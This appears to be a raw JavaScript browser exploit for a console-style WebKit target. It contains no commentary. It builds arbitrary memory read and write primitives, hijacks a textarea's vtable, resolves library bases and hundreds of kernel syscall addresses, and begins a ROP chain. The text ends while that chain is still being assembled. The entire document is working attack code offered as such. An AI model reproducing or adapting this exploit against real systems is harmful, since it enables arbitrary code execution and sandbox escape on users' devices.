var oob_master=new Uint32Array(1024);
var oob_slave=new Uint8Array(1024);
var leaker_arr=new Uint32Array(1024);
var leaker_obj={ a: 1234 };write64(addrof(oob_master).add(16),addrof(oob_slave));write64(addrof(leaker_arr).add(16),addrof(leaker_obj));
var i48_put=function (x,a) { a[4]=x | 0;a[5]=(x / 4294967296) | 0;}
var i48_get=function (a) { return a[4]+a[5] * 4294967296;}
var addrof=function (x) { leaker_obj.a=x;return i48_get(leaker_arr);}
var fakeobj=function (x) { i48_put(x,leaker_arr);return leaker_obj.a;}
var read_mem_setup=function (p,sz) { i48_put(p,oob_master);oob_master[6]=sz;}
var read_mem=function (p,sz) { read_mem_setup(p,sz);var arr=[];for (var i=0;i < sz;i++) arr.push(oob_slave[i]);return arr;}
var read_mem_s=function (p,sz) { read_mem_setup(p,sz);return ""+oob_slave;}
var read_mem_b=function (p,sz) { read_mem_setup(p,sz);var b=new Uint8Array(sz);b.set(oob_slave);return b;}
var read_mem_as_string=function (p,sz) { var x=read_mem_b(p,sz);var ans='';for (var i=0;i < x.length;i++) ans += String.fromCharCode(x[i]);return ans;}
var write_mem=function (p,data) { i48_put(p,oob_master);oob_master[6]=data.length;for (var i=0;i < data.length;i++) oob_slave[i]=data[i];}
var read_ptr_at=function (p) { var ans=0;var d=read_mem(p,8);for (var i=7;i >= 0;i--) ans=256 * ans+d[i];return ans;}
var write_ptr_at=function (p,d) { var arr=[];for (var i=0;i < 8;i++) { arr.push(d & 0xff);d /= 256;} write_mem(p,arr);}
var hex=function (x) { return (new Number(x)).toString(16);}
var malloc_nogc=[];function malloc(sz) { var arr=new Uint8Array(sz);malloc_nogc.push(arr);return read_ptr_at(addrof(arr)+0x10);}
var tarea=document.createElement('textarea');
var real_vt_ptr=read_ptr_at(addrof(tarea)+0x18);
var fake_vt_ptr=malloc(0x400);write_mem(fake_vt_ptr,read_mem(real_vt_ptr,0x400));write_ptr_at(addrof(tarea)+0x18,fake_vt_ptr);
var real_vtable=read_ptr_at(fake_vt_ptr);
var fake_vtable=malloc(0x2000);write_mem(fake_vtable,read_mem(real_vtable,0x2000));write_ptr_at(fake_vt_ptr,fake_vtable);
var fake_vt_ptr_bak=malloc(0x400);write_mem(fake_vt_ptr_bak,read_mem(fake_vt_ptr,0x400));
var plt_ptr=read_ptr_at(fake_vtable)-10117000;function get_got_addr(idx) { var p=plt_ptr+idx * 16;var q=read_mem(p,6);if (q[0] != 0xff || q[1] != 0x25) throw "invalid GOT entry";var offset=0;for (var i=5;i >= 2;i--) offset=offset * 256+q[i];offset += p+6;return read_ptr_at(offset);}
var webkit_base=read_ptr_at(fake_vtable);
var libkernel_base=get_got_addr(789);
var libc_base=get_got_addr(573);
var saveall_addr=libc_base+0x24174;
var loadall_addr=libc_base+0x285c8;
var pivot_addr=libc_base+0x2863e;
var infloop_addr=libc_base+0x3a9d0;
var jop_frame_addr=libc_base+0x67850;
var get_errno_addr_addr=libkernel_base+0x116c0;
var pthread_create_addr=libkernel_base+0x16fe0;function saveall() { var ans=malloc(0x800);var bak=read_ptr_at(fake_vtable+0x1d8);write_ptr_at(fake_vtable+0x1d8,saveall_addr);tarea.scrollLeft=0;write_mem(ans,read_mem(fake_vt_ptr,0x400));write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,0x400));var bak=read_ptr_at(fake_vtable+0x1d8);write_ptr_at(fake_vtable+0x1d8,saveall_addr);write_ptr_at(fake_vt_ptr+0x38,0x1234);tarea.scrollLeft=0;write_mem(ans+0x400,read_mem(fake_vt_ptr,0x400));write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,0x400));return ans;} function pivot(buf) { var ans=malloc(0x400);var bak=read_ptr_at(fake_vtable+0x1d8);write_ptr_at(fake_vtable+0x1d8,saveall_addr);tarea.scrollLeft=0;write_mem(ans,read_mem(fake_vt_ptr,0x400));write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,0x400));var bak=read_ptr_at(fake_vtable+0x1d8);write_ptr_at(fake_vtable+0x1d8,pivot_addr);write_ptr_at(fake_vt_ptr+0x38,buf);write_ptr_at(ans+0x38,read_ptr_at(ans+0x38)-16);write_ptr_at(buf,ans);tarea.scrollLeft=0;write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,0x400));}
var sys_545_addr=libkernel_base+0x264a0;var sys_47_addr=libkernel_base+0x264c0;var sys_554_addr=libkernel_base+0x264e0;var sys_35_addr=libkernel_base+0x26500;var sys_559_addr=libkernel_base+0x26520;var sys_643_addr=libkernel_base+0x26540;var sys_433_addr=libkernel_base+0x26560;var sys_183_addr=libkernel_base+0x26580;var sys_196_addr=libkernel_base+0x265a0;var sys_33_addr=libkernel_base+0x265c0;var sys_330_addr=libkernel_base+0x265e0;var sys_478_addr=libkernel_base+0x26600;var sys_79_addr=libkernel_base+0x26620;var sys_639_addr=libkernel_base+0x26640;var sys_147_addr=libkernel_base+0x26660;var sys_363_addr=libkernel_base+0x26680;var sys_596_addr=libkernel_base+0x266a0;var sys_333_addr=libkernel_base+0x266c0;var sys_655_addr=libkernel_base+0x266e0;var sys_334_addr=libkernel_base+0x26700;var sys_552_addr=libkernel_base+0x26720;var sys_637_addr=libkernel_base+0x26740;var sys_664_addr=libkernel_base+0x26760;var sys_120_addr=libkernel_base+0x26780;var sys_80_addr=libkernel_base+0x267a0;var sys_543_addr=libkernel_base+0x26870;var sys_553_addr=libkernel_base+0x26890;var sys_580_addr=libkernel_base+0x268b0;var sys_482_addr=libkernel_base+0x268d0;var sys_564_addr=libkernel_base+0x268f0;var sys_649_addr=libkernel_base+0x26910;var sys_238_addr=libkernel_base+0x26930;var sys_5_addr=libkernel_base+0x26950;var sys_340_addr=libkernel_base+0x26973;var sys_673_addr=libkernel_base+0x26a00;var sys_29_addr=libkernel_base+0x26a20;var sys_232_addr=libkernel_base+0x26a40;var sys_604_addr=libkernel_base+0x26a60;var sys_442_addr=libkernel_base+0x26a80;var sys_594_addr=libkernel_base+0x26aa0;var sys_116_addr=libkernel_base+0x26ac0;var sys_190_addr=libkernel_base+0x26ae0;var sys_346_addr=libkernel_base+0x26b00;var sys_613_addr=libkernel_base+0x26b20;var sys_1_addr=libkernel_base+0x26b50;var sys_50_addr=libkernel_base+0x26b70;var sys_10_addr=libkernel_base+0x26ba0;var sys_27_addr=libkernel_base+0x26bc0;var sys_663_addr=libkernel_base+0x26be0;var sys_102_addr=libkernel_base+0x26c00;var sys_546_addr=libkernel_base+0x26c20;var sys_182_addr=libkernel_base+0x26c40;var sys_566_addr=libkernel_base+0x26c60;var sys_611_addr=libkernel_base+0x26c80;var sys_560_addr=libkernel_base+0x26ca0;var sys_572_addr=libkernel_base+0x26cc0;var sys_234_addr=libkernel_base+0x26ce0;var sys_675_addr=libkernel_base+0x26d00;var sys_612_addr=libkernel_base+0x26d20;var sys_34_addr=libkernel_base+0x26d40;var sys_455_addr=libkernel_base+0x26d60;var sys_122_addr=libkernel_base+0x26d80;var sys_592_addr=libkernel_base+0x26da0;var sys_2_addr=libkernel_base+0x26dc0;var sys_588_addr=libkernel_base+0x26de0;var sys_331_addr=libkernel_base+0x26e00;var sys_204_addr=libkernel_base+0x26e20;var sys_78_addr=libkernel_base+0x26e40;var sys_202_addr=libkernel_base+0x26e60;var sys_421_addr=libkernel_base+0x26e84;var sys_599_addr=libkernel_base+0x26eb0;var sys_237_addr=libkernel_base+0x26ed0;var sys_189_addr=libkernel_base+0x26ef0;var sys_7_addr=libkernel_base+0x26f10;var sys_661_addr=libkernel_base+0x26f30;var sys_39_addr=libkernel_base+0x26f50;var sys_548_addr=libkernel_base+0x26f70;var sys_620_addr=libkernel_base+0x26f90;var sys_648_addr=libkernel_base+0x26fb0;var sys_340_addr=libkernel_base+0x26fd0;var sys_36_addr=libkernel_base+0x26ff0;var sys_194_addr=libkernel_base+0x27010;var sys_192_addr=libkernel_base+0x27030;var sys_615_addr=libkernel_base+0x27050;var sys_541_addr=libkernel_base+0x27070;var sys_195_addr=libkernel_base+0x27090;var sys_43_addr=libkernel_base+0x270b0;var sys_486_addr=libkernel_base+0x270d0;var sys_315_addr=libkernel_base+0x270f0;var sys_98_addr=libkernel_base+0x27110;var sys_591_addr=libkernel_base+0x27130;var sys_481_addr=libkernel_base+0x27150;var sys_422_addr=libkernel_base+0x27170;var sys_660_addr=libkernel_base+0x27190;var sys_536_addr=libkernel_base+0x271b0;var sys_532_addr=libkernel_base+0x271d0;var sys_25_addr=libkernel_base+0x271f0;var sys_203_addr=libkernel_base+0x27210;var sys_37_addr=libkernel_base+0x27230;var sys_549_addr=libkernel_base+0x27250;var sys_656_addr=libkernel_base+0x27270;var sys_44_addr=libkernel_base+0x27290;var sys_565_addr=libkernel_base+0x272b0;var sys_600_addr=libkernel_base+0x272d0;var sys_125_addr=libkernel_base+0x272f0;var sys_379_addr=libkernel_base+0x27310;var sys_95_addr=libkernel_base+0x27330;var sys_583_addr=libkernel_base+0x27350;var sys_522_addr=libkernel_base+0x27370;var sys_239_addr=libkernel_base+0x27390;var sys_55_addr=libkernel_base+0x273b0;var sys_544_addr=libkernel_base+0x273d0;var sys_134_addr=libkernel_base+0x273f0;var sys_289_addr=libkernel_base+0x27410;var sys_131_addr=libkernel_base+0x27430;var sys_654_addr=libkernel_base+0x27450;var sys_124_addr=libkernel_base+0x27470;var sys_586_addr=libkernel_base+0x27490;var sys_4_addr=libkernel_base+0x274b0;var sys_555_addr=libkernel_base+0x274d0;var sys_416_addr=libkernel_base+0x274f0;var sys_59_addr=libkernel_base+0x2751d;var sys_563_addr=libkernel_base+0x27540;var sys_329_addr=libkernel_base+0x27560;var sys_406_addr=libkernel_base+0x27580;var sys_582_addr=libkernel_base+0x275a0;var sys_137_addr=libkernel_base+0x275c0;var sys_538_addr=libkernel_base+0x275e0;var sys_456_addr=libkernel_base+0x27600;var sys_677_addr=libkernel_base+0x27620;var sys_668_addr=libkernel_base+0x27640;var sys_444_addr=libkernel_base+0x27660;var sys_669_addr=libkernel_base+0x27680;var sys_105_addr=libkernel_base+0x276a0;var sys_20_addr=libkernel_base+0x276c0;var sys_628_addr=libkernel_base+0x276e0;var sys_206_addr=libkernel_base+0x27700;var sys_487_addr=libkernel_base+0x27720;var sys_618_addr=libkernel_base+0x27740;var sys_49_addr=libkernel_base+0x27760;var sys_332_addr=libkernel_base+0x27780;var sys_670_addr=libkernel_base+0x277a0;var sys_595_addr=libkernel_base+0x277c0;var sys_431_addr=libkernel_base+0x277e0;var sys_104_addr=libkernel_base+0x27800;var sys_117_addr=libkernel_base+0x27820;var sys_12_addr=libkernel_base+0x27840;var sys_587_addr=libkernel_base+0x27860;var sys_405_addr=libkernel_base+0x27880;var sys_97_addr=libkernel_base+0x278a0;var sys_619_addr=libkernel_base+0x278c0;var sys_641_addr=libkernel_base+0x278e0;var sys_585_addr=libkernel_base+0x27900;var sys_671_addr=libkernel_base+0x27920;var sys_209_addr=libkernel_base+0x27940;var sys_191_addr=libkernel_base+0x27960;var sys_407_addr=libkernel_base+0x27980;var sys_83_addr=libkernel_base+0x279a0;var sys_240_addr=libkernel_base+0x279c0;var sys_602_addr=libkernel_base+0x279e0;var sys_42_addr=libkernel_base+0x27a00;var sys_41_addr=libkernel_base+0x27a30;var sys_408_addr=libkernel_base+0x27a50;var sys_551_addr=libkernel_base+0x27a70;var sys_488_addr=libkernel_base+0x27a90;var sys_99_addr=libkernel_base+0x27ab0;var sys_624_addr=libkernel_base+0x27ad0;var sys_310_addr=libkernel_base+0x27af0;var sys_138_addr=libkernel_base+0x27b10;var sys_328_addr=libkernel_base+0x27b30;var sys_475_addr=libkernel_base+0x27b50;var sys_30_addr=libkernel_base+0x27b70;var sys_499_addr=libkernel_base+0x27b90;var sys_253_addr=libkernel_base+0x27bb0;var sys_56_addr=libkernel_base+0x27bd0;var sys_593_addr=libkernel_base+0x27bf0;var sys_114_addr=libkernel_base+0x27c10;var sys_676_addr=libkernel_base+0x27c30;var sys_235_addr=libkernel_base+0x27c50;var sys_126_addr=libkernel_base+0x27c70;var sys_598_addr=libkernel_base+0x27c90;var sys_608_addr=libkernel_base+0x27cb0;var sys_136_addr=libkernel_base+0x27cd0;var sys_636_addr=libkernel_base+0x27cf0;var sys_402_addr=libkernel_base+0x27d10;var sys_629_addr=libkernel_base+0x27d30;var sys_556_addr=libkernel_base+0x27d50;var sys_435_addr=libkernel_base+0x27d70;var sys_657_addr=libkernel_base+0x27d90;var sys_605_addr=libkernel_base+0x27db0;var sys_432_addr=libkernel_base+0x27dd0;var sys_627_addr=libkernel_base+0x27df0;var sys_31_addr=libkernel_base+0x27e10;var sys_417_addr=libkernel_base+0x27e30;var sys_272_addr=libkernel_base+0x27e50;var sys_165_addr=libkernel_base+0x27e70;var sys_441_addr=libkernel_base+0x27e90;var sys_632_addr=libkernel_base+0x27eb0;var sys_113_addr=libkernel_base+0x27ed0;var sys_397_addr=libkernel_base+0x27ef0;var sys_23_addr=libkernel_base+0x27f10;var sys_140_addr=libkernel_base+0x27f30;var sys_28_addr=libkernel_base+0x27f50;var sys_635_addr=libkernel_base+0x27f70;var sys_581_addr=libkernel_base+0x27f90;var sys_659_addr=libkernel_base+0x27fb0;var sys_603_addr=libkernel_base+0x27fd0;var sys_610_addr=libkernel_base+0x27ff0;var sys_666_addr=libkernel_base+0x28010;var sys_236_addr=libkernel_base+0x28030;var sys_634_addr=libkernel_base+0x28050;var sys_121_addr=libkernel_base+0x28070;var sys_401_addr=libkernel_base+0x28090;var sys_642_addr=libkernel_base+0x280b0;var sys_540_addr=libkernel_base+0x280d0;var sys_73_addr=libkernel_base+0x280f0;var sys_59_addr=libkernel_base+0x28110;var sys_539_addr=libkernel_base+0x28130;var sys_623_addr=libkernel_base+0x28150;var sys_672_addr=libkernel_base+0x28170;var sys_392_addr=libkernel_base+0x28190;var sys_74_addr=libkernel_base+0x281b0;var sys_327_addr=libkernel_base+0x281d0;var sys_15_addr=libkernel_base+0x281f0;var sys_325_addr=libkernel_base+0x28210;var sys_141_addr=libkernel_base+0x28230;var sys_54_addr=libkernel_base+0x28250;var sys_674_addr=libkernel_base+0x28270;var sys_430_addr=libkernel_base+0x28290;var sys_127_addr=libkernel_base+0x282b0;var sys_483_addr=libkernel_base+0x282d0;var sys_133_addr=libkernel_base+0x282f0;var sys_434_addr=libkernel_base+0x28310;var sys_92_addr=libkernel_base+0x28330;var sys_324_addr=libkernel_base+0x28350;var sys_128_addr=libkernel_base+0x28370;var sys_454_addr=libkernel_base+0x28390;var sys_341_addr=libkernel_base+0x283a0;var sys_75_addr=libkernel_base+0x283c0;var sys_558_addr=libkernel_base+0x283e0;var sys_423_addr=libkernel_base+0x28400;var sys_638_addr=libkernel_base+0x28420;var sys_477_addr=libkernel_base+0x28440;var sys_584_addr=libkernel_base+0x28460;var sys_550_addr=libkernel_base+0x28480;var sys_106_addr=libkernel_base+0x284a0;var sys_135_addr=libkernel_base+0x284c0;var sys_647_addr=libkernel_base+0x284e0;var sys_443_addr=libkernel_base+0x28500;var sys_466_addr=libkernel_base+0x28520;var sys_542_addr=libkernel_base+0x28540;var sys_454_addr=libkernel_base+0x28560;var sys_429_addr=libkernel_base+0x28580;var sys_393_addr=libkernel_base+0x285a0;var sys_658_addr=libkernel_base+0x285c0;var sys_404_addr=libkernel_base+0x285e0;var sys_101_addr=libkernel_base+0x28600;var sys_96_addr=libkernel_base+0x28620;var sys_118_addr=libkernel_base+0x28640;var sys_640_addr=libkernel_base+0x28660;var sys_6_addr=libkernel_base+0x28680;var sys_601_addr=libkernel_base+0x286a0;var sys_653_addr=libkernel_base+0x286c0;var sys_479_addr=libkernel_base+0x286e0;var sys_626_addr=libkernel_base+0x28700;var sys_557_addr=libkernel_base+0x28720;var sys_646_addr=libkernel_base+0x28740;var sys_533_addr=libkernel_base+0x28760;var sys_400_addr=libkernel_base+0x28780;var sys_535_addr=libkernel_base+0x287a0;var sys_616_addr=libkernel_base+0x287c0;var sys_464_addr=libkernel_base+0x287e0;var sys_93_addr=libkernel_base+0x28800;var sys_633_addr=libkernel_base+0x28820;var sys_662_addr=libkernel_base+0x28840;var sys_65_addr=libkernel_base+0x28860;var sys_53_addr=libkernel_base+0x28880;var sys_617_addr=libkernel_base+0x288a0;var sys_90_addr=libkernel_base+0x288c0;var sys_233_addr=libkernel_base+0x288e0;var sys_403_addr=libkernel_base+0x28900;var sys_622_addr=libkernel_base+0x28920;var sys_667_addr=libkernel_base+0x28940;var sys_625_addr=libkernel_base+0x28960;var sys_362_addr=libkernel_base+0x28980;var sys_567_addr=libkernel_base+0x289a0;var sys_32_addr=libkernel_base+0x289c0;var sys_607_addr=libkernel_base+0x289e0;var sys_665_addr=libkernel_base+0x28a00;var sys_547_addr=libkernel_base+0x28a20;var sys_251_addr=libkernel_base+0x28a49;var sys_1_addr=libkernel_base+0x28a6a;var sys_345_addr=libkernel_base+0x28a90;var sys_100_addr=libkernel_base+0x28ab0;var sys_652_addr=libkernel_base+0x28ad0;var sys_89_addr=libkernel_base+0x28af0;var sys_606_addr=libkernel_base+0x28b10;var sys_534_addr=libkernel_base+0x28b30;var sys_24_addr=libkernel_base+0x28b50;var sys_476_addr=libkernel_base+0x28b70;var sys_480_addr=libkernel_base+0x28b90;var sys_343_addr=libkernel_base+0x28bb0;var sys_630_addr=libkernel_base+0x28bd0;var sys_86_addr=libkernel_base+0x28bf0;var sys_3_addr=libkernel_base+0x28c10;var sys_188_addr=libkernel_base+0x28c30;var sys_290_addr=libkernel_base+0x28c50;
var evf_clear_addr=sys_545_addr;var getgid_addr=sys_47_addr;var osem_trywait_addr=sys_554_addr;var fchflags_addr=sys_35_addr;var set_vm_container_addr=sys_559_addr;var set_chicken_switches_addr=sys_643_addr;var thr_kill_addr=sys_433_addr;var seteuid_addr=sys_183_addr;var getdirentries_addr=sys_196_addr;var access_addr=sys_33_addr;var sched_getscheduler_addr=sys_330_addr;var lseek_addr=sys_478_addr;var getgroups_addr=sys_79_addr;var localtime_to_utc_addr=sys_639_addr;var setsid_addr=sys_147_addr;var kevent_addr=sys_363_addr;var dynlib_do_copy_relocations_addr=sys_596_addr;var sched_get_priority_min_addr=sys_333_addr;var blockpool_unmap_addr=sys_655_addr;var sched_rr_get_interval_addr=sys_334_addr;var osem_close_addr=sys_552_addr;var set_phys_fmem_limit_addr=sys_637_addr;var aio_multi_poll_addr=sys_664_addr;var readv_addr=sys_120_addr;var setgroups_addr=sys_80_addr;var evf_trywait_addr=sys_543_addr;var osem_wait_addr=sys_553_addr;var eport_create_addr=sys_580_addr;var shm_open_addr=sys_482_addr;var opmc_disable_addr=sys_564_addr;var dynlib_get_obj_member_addr=sys_649_addr;var ktimer_gettime_addr=sys_238_addr;var open_addr=sys_5_addr;var sigprocmask_addr=sys_340_addr;var blockpool_move_addr=sys_673_addr;var recvfrom_addr=sys_29_addr;var clock_gettime_addr=sys_232_addr;var dl_get_metadata_addr=sys_604_addr;var thr_suspend_addr=sys_442_addr;var dynlib_load_prx_addr=sys_594_addr;var gettimeofday_addr=sys_116_addr;var lstat_addr=sys_190_addr;var sigwaitinfo_addr=sys_346_addr;var get_resident_count_addr=sys_613_addr;var sys_exit_addr=sys_1_addr;var setlogin_addr=sys_50_addr;var unlink_addr=sys_10_addr;var recvmsg_addr=sys_27_addr;var aio_multi_wait_addr=sys_663_addr;var netgetsockinfo_addr=sys_102_addr;var evf_cancel_addr=sys_546_addr;var setegid_addr=sys_182_addr;var opmc_set_ctr_addr=sys_566_addr;var get_paging_stats_of_all_threads_addr=sys_611_addr;var debug_init_addr=sys_560_addr;var virtual_query_addr=sys_572_addr;var clock_getres_addr=sys_234_addr;var reserve_2mb_page_addr=sys_675_addr;var get_proc_type_info_addr=sys_612_addr;var chflags_addr=sys_34_addr;var thr_new_addr=sys_455_addr;var settimeofday_addr=sys_122_addr;var dynlib_get_list_addr=sys_592_addr;var fork_addr=sys_2_addr;var mname_addr=sys_588_addr;var sched_yield_addr=sys_331_addr;var munlock_addr=sys_204_addr;var mincore_addr=sys_78_addr;var __sysctl_addr=sys_202_addr;var getcontext_addr=sys_421_addr;var dynlib_process_needed_and_relocate_addr=sys_599_addr;var ktimer_settime_addr=sys_237_addr;var fstat_addr=sys_189_addr;var wait4_addr=sys_7_addr;var aio_submit_addr=sys_661_addr;var getppid_addr=sys_39_addr;var batch_map_addr=sys_548_addr;var free_stack_addr=sys_620_addr;var app_state_change_addr=sys_648_addr;var sigprocmask_addr=sys_340_addr;var sync_addr=sys_36_addr;var getrlimit_addr=sys_194_addr;var fpathconf_addr=sys_192_addr;var get_resident_fmem_count_addr=sys_615_addr;var evf_close_addr=sys_541_addr;var setrlimit_addr=sys_195_addr;var getegid_addr=sys_43_addr;var cpuset_getid_addr=sys_486_addr;var aio_suspend_addr=sys_315_addr;var connect_addr=sys_98_addr;var dynlib_dlsym_addr=sys_591_addr;var thr_kill2_addr=sys_481_addr;var setcontext_addr=sys_422_addr;var dynlib_get_info2_addr=sys_660_addr;var dl_get_info_addr=sys_536_addr;var regmgr_call_addr=sys_532_addr;var geteuid_addr=sys_25_addr;var mlock_addr=sys_203_addr;var kill_addr=sys_37_addr;var osem_create_addr=sys_549_addr;var dynlib_get_info_for_libdbg_addr=sys_656_addr;var profil_addr=sys_44_addr;var opmc_set_ctl_addr=sys_565_addr;var sandbox_path_addr=sys_600_addr;var netgetiflist_addr=sys_125_addr;var mtypeprotect_addr=sys_379_addr;var fsync_addr=sys_95_addr;var eport_open_addr=sys_583_addr;var pselect_addr=sys_522_addr;var ktimer_getoverrun_addr=sys_239_addr;var reboot_addr=sys_55_addr;var evf_set_addr=sys_544_addr;var shutdown_addr=sys_134_addr;var preadv_addr=sys_289_addr;var flock_addr=sys_131_addr;var blockpool_map_addr=sys_654_addr;var fchmod_addr=sys_124_addr;var dmem_container_addr=sys_586_addr;var write_addr=sys_4_addr;var osem_post_addr=sys_555_addr;var sigaction_addr=sys_416_addr;var execve_addr=sys_59_addr;var opmc_enable_addr=sys_563_addr;var sched_setscheduler_addr=sys_329_addr;var ksem_unlink_addr=sys_406_addr;var eport_trigger_addr=sys_582_addr;var rmdir_addr=sys_137_addr;var evf_create_addr=sys_538_addr;var sigqueue_addr=sys_456_addr;var get_phys_page_size_addr=sys_677_addr;var aio_create_addr=sys_668_addr;var kldunloadf_addr=sys_444_addr;var aio_submit_cmd_addr=sys_669_addr;var setsockopt_addr=sys_105_addr;var getpid_addr=sys_20_addr;var mmap_dmem_addr=sys_628_addr;var futimes_addr=sys_206_addr;var cpuset_getaffinity_addr=sys_487_addr;var get_paging_stats_of_all_objects_addr=sys_618_addr;var getlogin_addr=sys_49_addr;var sched_get_priority_max_addr=sys_332_addr;var aio_init_addr=sys_670_addr;var dynlib_unload_prx_addr=sys_595_addr;var thr_exit_addr=sys_431_addr;var bind_addr=sys_104_addr;var getrusage_addr=sys_117_addr;var chdir_addr=sys_12_addr;var get_authinfo_addr=sys_587_addr;var ksem_open_addr=sys_405_addr;var socket_addr=sys_97_addr;var test_debug_rwmem_addr=sys_619_addr;var get_cpu_usage_proc_addr=sys_641_addr;var is_in_sandbox_addr=sys_585_addr;var get_page_table_stats_addr=sys_671_addr;var poll_addr=sys_209_addr;var pathconf_addr=sys_191_addr;var ksem_getvalue_addr=sys_407_addr;var setitimer_addr=sys_83_addr;var nanosleep_addr=sys_240_addr;var randomized_path_addr=sys_602_addr;var pipe_addr=sys_42_addr;var dup_addr=sys_41_addr;var ksem_destroy_addr=sys_408_addr;var osem_open_addr=sys_551_addr;var cpuset_setaffinity_addr=sys_488_addr;var netcontrol_addr=sys_99_addr;var get_vm_map_timestamp_addr=sys_624_addr;var getsid_addr=sys_310_addr;var utimes_addr=sys_138_addr;var sched_getparam_addr=sys_328_addr;var pread_addr=sys_475_addr;var accept_addr=sys_30_addr;var openat_addr=sys_499_addr;var issetugid_addr=sys_253_addr;var revoke_addr=sys_56_addr;var dynlib_get_info_addr=sys_593_addr;var socketclose_addr=sys_114_addr;var cpumode_yield_addr=sys_676_addr;var ktimer_create_addr=sys_235_addr;var setreuid_addr=sys_126_addr;var dynlib_get_proc_param_addr=sys_598_addr;var dynlib_get_info_ex_addr=sys_608_addr;var mkdir_addr=sys_136_addr;var set_timezone_info_addr=sys_636_addr;var ksem_wait_addr=sys_402_addr;var physhm_open_addr=sys_629_addr;var osem_cancel_addr=sys_556_addr;var _umtx_unlock_addr=sys_435_addr;var blockpool_batch_addr=sys_657_addr;var workaround8849_addr=sys_605_addr;var thr_self_addr=sys_432_addr;var get_cpu_usage_all_addr=sys_627_addr;var getpeername_addr=sys_31_addr;var sigreturn_addr=sys_417_addr;var getdents_addr=sys_272_addr;var sysarch_addr=sys_165_addr;var ksem_timedwait_addr=sys_441_addr;var thr_suspend_ucontext_addr=sys_632_addr;var socketex_addr=sys_113_addr;var fstatfs_addr=sys_397_addr;var setuid_addr=sys_23_addr;var adjtime_addr=sys_140_addr;var sendmsg_addr=sys_28_addr;var thr_set_ucontext_addr=sys_635_addr;var eport_delete_addr=sys_581_addr;var dynlib_get_list2_addr=sys_659_addr;var rdup_addr=sys_603_addr;var budget_get_ptype_addr=sys_610_addr;var aio_multi_cancel_addr=sys_666_addr;var ktimer_delete_addr=sys_236_addr;var thr_get_ucontext_addr=sys_634_addr;var writev_addr=sys_121_addr;var ksem_post_addr=sys_401_addr;var get_map_statistics_addr=sys_642_addr;var evf_open_addr=sys_540_addr;var munmap_addr=sys_73_addr;var execve_addr=sys_59_addr;var evf_delete_addr=sys_539_addr;var get_gpo_addr=sys_623_addr;var dynlib_get_list_for_libdbg_addr=sys_672_addr;var uuidgen_addr=sys_392_addr;var mprotect_addr=sys_74_addr;var sched_setparam_addr=sys_327_addr;var chmod_addr=sys_15_addr;var munlockall_addr=sys_325_addr;var kqueueex_addr=sys_141_addr;var ioctl_addr=sys_54_addr;var virtual_query_all_addr=sys_674_addr;var thr_create_addr=sys_430_addr;var setregid_addr=sys_127_addr;var shm_unlink_addr=sys_483_addr;var sendto_addr=sys_133_addr;
var _umtx_lock_addr=sys_434_addr;var fcntl_addr=sys_92_addr;var mlockall_addr=sys_324_addr;var rename_addr=sys_128_addr;var _umtx_op_addr=sys_454_addr;var sigsuspend_addr=sys_341_addr;var madvise_addr=sys_75_addr;var namedobj_delete_addr=sys_558_addr;var swapcontext_addr=sys_423_addr;var utc_to_localtime_addr=sys_638_addr;var mmap_addr=sys_477_addr;var eport_close_addr=sys_584_addr;var osem_delete_addr=sys_550_addr;var listen_addr=sys_106_addr;var socketpair_addr=sys_135_addr;var get_sdk_compiled_version_addr=sys_647_addr;var thr_wake_addr=sys_443_addr;var rtprio_thread_addr=sys_466_addr;var evf_wait_addr=sys_542_addr;var _umtx_op_addr=sys_454_addr;var sigwait_addr=sys_429_addr;var sendfile_addr=sys_393_addr;var fdatasync_addr=sys_658_addr;var ksem_init_addr=sys_404_addr;var netabort_addr=sys_101_addr;var setpriority_addr=sys_96_addr;var getsockopt_addr=sys_118_addr;var set_uevt_addr=sys_640_addr;var close_addr=sys_6_addr;var mdbg_service_addr=sys_601_addr;var blockpool_open_addr=sys_653_addr;var truncate_addr=sys_479_addr;var opmc_get_hw_addr=sys_626_addr;var namedobj_create_addr=sys_557_addr;var get_kernel_mem_statistics_addr=sys_646_addr;var jitshm_create_addr=sys_533_addr;var ksem_close_addr=sys_400_addr;var dl_get_list_addr=sys_535_addr;var thr_get_name_addr=sys_616_addr;var thr_set_name_addr=sys_464_addr;var select_addr=sys_93_addr;var thr_resume_ucontext_addr=sys_633_addr;var aio_multi_delete_addr=sys_662_addr;var msync_addr=sys_65_addr;var sigaltstack_addr=sys_53_addr;var set_gpo_addr=sys_617_addr;var dup2_addr=sys_90_addr;var clock_settime_addr=sys_233_addr;var ksem_trywait_addr=sys_403_addr;var ipmimgr_call_addr=sys_622_addr;var get_bio_usage_all_addr=sys_667_addr;var opmc_set_hw_addr=sys_625_addr;var kqueue_addr=sys_362_addr;var opmc_get_ctr_addr=sys_567_addr;var getsockname_addr=sys_32_addr;var get_self_auth_info_addr=sys_607_addr;var aio_get_data_addr=sys_665_addr;var query_memory_protection_addr=sys_547_addr;var rfork_addr=sys_251_addr;var sys_exit_addr=sys_1_addr;var sigtimedwait_addr=sys_345_addr;var getpriority_addr=sys_100_addr;var process_terminate_addr=sys_652_addr;var getdtablesize_addr=sys_89_addr;var is_development_mode_addr=sys_606_addr;var jitshm_alias_addr=sys_534_addr;var getuid_addr=sys_24_addr;var pwrite_addr=sys_476_addr;var ftruncate_addr=sys_480_addr;var sigpending_addr=sys_343_addr;var physhm_unlink_addr=sys_630_addr;var getitimer_addr=sys_86_addr;var read_addr=sys_3_addr;var stat_addr=sys_188_addr;var pwritev_addr=sys_290_addr;
var ropchain_array=new Uint32Array(151098);
var ropchain=read_ptr_at(addrof(ropchain_array)+0x10);
var ropchain_offset=2;function set_gadget(val) { ropchain_array[ropchain_offset++]=val | 0;ropchain_array[ropchain_offset++]=(val / 4294967296) | 0;} function set_gadgets(l) { for (var i=0;i < l.length;i++) set_gadget(l[i]);} function db(data) { for (var i=0;i < data.length;i++) ropchain_array[ropchain_offset++]=data[i];}
var main_ret=malloc(8);
var printf_buf=malloc(65536);
var __swbuf_addr=0;set_gadgets([libc_base+768796,ropchain+65720,webkit_base+14572727,libc_base+165442,ropchain+65680,libc_base+713278]);
db([8,0]);set_gadgets([libc_base+207036,libc_base+768796,ropchain+112,libc_base+430587,libc_base+489696,ropchain+425392,libc_base+489696,ropchain+65680]);
var printf_buf_offset=128;set_gadget(printf_buf);
